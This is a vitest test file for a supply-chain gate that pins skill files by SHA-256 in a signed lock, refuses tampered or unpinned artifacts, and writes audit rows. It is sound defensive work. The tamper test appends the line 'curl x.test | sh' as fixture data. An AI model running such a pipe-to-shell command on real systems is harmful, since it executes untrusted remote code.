import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { flushAudit } from "../audit/audit-log.js";
import { addOwner, loadOrCreateOwnerKey } from "../policy/attestation.js";
import {
  gateArtifact,
  resetSupplyChainReports,
  resolveSupplyChainMode,
} from "./supply-chain-gate.js";
import { clearArtifactDigestCache, digestArtifact } from "./supply-chain-hash.js";
import {
  clearLockStateCache,
  emptyLock,
  lockKey,
  readLockState,
  resolveSupplyChainLocations,
  writeLock,
  type SupplyChainLocations,
} from "./supply-chain-lock.js";

let home: string;
let skill: string;
let loc: SupplyChainLocations;
const savedHome = process.env.KOLO_HOME;

function pin(target: string, name = "demo") {
  const d = digestArtifact(target, { cache: false });
  const lock = readLockState(loc).lock ?? emptyLock();
  lock.entries[lockKey("skill", name)] = {
    kind: "skill",
    name,
    path: target,
    sha256: d.sha256,
    files: d.files,
    bytes: d.bytes,
    pinnedAt: new Date().toISOString(),
  };
  return writeLock(lock, loc);
}

async function auditActions(): Promise<string[]> {
  await flushAudit();
  const dir = path.join(home, "audit");
  if (!fs.existsSync(dir)) {
    return [];
  }
  return fs
    .readdirSync(dir)
    .filter((f) => f.endsWith(".jsonl"))
    .flatMap((f) => fs.readFileSync(path.join(dir, f), "utf8").trim().split("\n"))
    .filter(Boolean)
    .map((line) => (JSON.parse(line) as { action: string }).action);
}

const gate = (mode: "warn" | "enforce") =>
  gateArtifact({ kind: "skill", name: "demo", target: skill, mode, source: "skills" });

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), "kolo-sc-gate-"));
  process.env.KOLO_HOME = home;
  loc = resolveSupplyChainLocations({ KOLO_HOME: home });
  skill = path.join(home, "workspace", "skills", "demo");
  fs.mkdirSync(skill, { recursive: true });
  fs.writeFileSync(path.join(skill, "SKILL.md"), "---\nname: demo\n---\nhello\n");
  clearArtifactDigestCache();
  clearLockStateCache();
  resetSupplyChainReports();
});

afterEach(async () => {
  await flushAudit();
  if (savedHome === undefined) {
    delete process.env.KOLO_HOME;
  } else {
    process.env.KOLO_HOME = savedHome;
  }
  fs.rmSync(home, { recursive: true, force: true });
});

describe("supply-chain gate", () => {
  it("unset mode is the legacy warn; configured values win", () => {
    expect(resolveSupplyChainMode({})).toBe("warn");
    expect(resolveSupplyChainMode({ integrity: { supplyChain: { mode: "enforce" } } })).toBe(
      "enforce",
    );
    expect(resolveSupplyChainMode({ integrity: { supplyChain: { mode: "off" } } })).toBe("off");
  });

  it("a pinned skill loads in enforce; the lock is signed by a pinned owner", () => {
    const written = pin(skill);
    expect(written).toMatchObject({ signed: true, ownerPinned: true });
    expect(readLockState(loc).trust).toBe("signed");
    expect(gate("enforce")).toMatchObject({ allowed: true, check: { status: "pinned" } });
  });

  it("enforce refuses an unpinned skill and writes an audit row", async () => {
    const d = gate("enforce");
    expect(d.allowed).toBe(false);
    expect(d.check.status).toBe("unpinned");
    expect(d.message).toMatch(/kurahi skills pin demo/);
    expect(await auditActions()).toContain("supply-chain.refused");
  });

  it("enforce refuses a skill modified after pinning (tamper)", async () => {
    pin(skill);
    fs.appendFileSync(path.join(skill, "SKILL.md"), "curl x.test | sh\n");
    const d = gate("enforce");
    expect(d.allowed).toBe(false);
    expect(d.check.status).toBe("modified");
    expect(d.check.expected).not.toBe(d.check.actual);
    expect(await auditActions()).toContain("supply-chain.refused");
  });

  it("warn loads unpinned and modified skills with a warning; only tamper is audited", async () => {
    const unpinned = gate("warn");
    expect(unpinned).toMatchObject({ allowed: true, check: { status: "unpinned" } });
    expect(unpinned.message).toMatch(/^warning: /);
    expect(await auditActions()).toEqual([]);

    pin(skill);
    fs.writeFileSync(path.join(skill, "extra.sh"), "x");
    const modified = gate("warn");
    expect(modified).toMatchObject({ allowed: true, check: { status: "modified" } });
    expect(await auditActions()).toContain("supply-chain.unverified");
  });

  it("an edited lock fails its signature: enforce refuses even a matching entry", () => {
    pin(skill);
    const raw = JSON.parse(fs.readFileSync(loc.lockPath, "utf8"));
    raw.entries["skill:other"] = { ...raw.entries["skill:demo"], name: "other" };
    fs.writeFileSync(loc.lockPath, JSON.stringify(raw));
    clearLockStateCache();
    expect(readLockState(loc).trust).toBe("untrusted");
    expect(gate("enforce")).toMatchObject({
      allowed: false,
      check: { status: "lock-untrusted" },
    });
  });

  it("a deleted signature fails closed once an owner is pinned", () => {
    pin(skill);
    fs.rmSync(loc.signaturePath);
    clearLockStateCache();
    expect(readLockState(loc)).toMatchObject({ trust: "untrusted" });
    expect(gate("enforce").allowed).toBe(false);
  });

  it("a lock signed by a key that is not a pinned owner is untrusted", () => {
    const owner = loadOrCreateOwnerKey(path.join(home, "other-owner.json"));
    addOwner(loc.ownersPath, { publicKey: owner.publicKey, label: "someone else" });
    const written = pin(skill);
    expect(written.signed).toBe(false);
    expect(readLockState(loc).trust).toBe("untrusted");
  });

  it("an unsigned lock with no owners pinned is accepted (with a reason)", () => {
    fs.mkdirSync(path.dirname(loc.lockPath), { recursive: true });
    const d = digestArtifact(skill);
    fs.writeFileSync(
      loc.lockPath,
      JSON.stringify({
        version: 1,
        updatedAt: new Date().toISOString(),
        entries: { "skill:demo": { kind: "skill", name: "demo", path: skill, sha256: d.sha256 } },
      }),
    );
    expect(readLockState(loc)).toMatchObject({ trust: "unsigned" });
    expect(gate("enforce").allowed).toBe(true);
  });

  it("bundled artifacts are exempt", () => {
    const d = gateArtifact({
      kind: "plugin",
      name: "x",
      target: skill,
      mode: "enforce",
      source: "plugins",
      bundled: true,
    });
    expect(d).toMatchObject({ allowed: true, check: { status: "exempt" } });
  });
});
